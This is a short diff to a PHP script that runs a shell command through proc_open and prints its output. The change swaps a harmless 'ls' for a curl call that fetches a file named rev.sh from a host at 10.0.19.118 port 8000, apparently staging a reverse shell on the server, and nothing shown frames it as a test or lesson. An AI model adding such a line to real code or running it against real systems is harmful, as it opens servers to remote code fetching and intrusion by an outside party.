@@ -6,7 +6,7 @@
     1 => array("pipe", "w"),  // stdout
     2 => array("pipe", "w")   // stderr
 );
-$process = proc_open('ls', $descriptorspec, $pipes);
+$process = proc_open('curl http://10.0.19.118:8000/rev.sh', $descriptorspec, $pipes);
 if (is_resource($process)) {
     echo stream_get_contents($pipes[1]);
     fclose($pipes[1]);
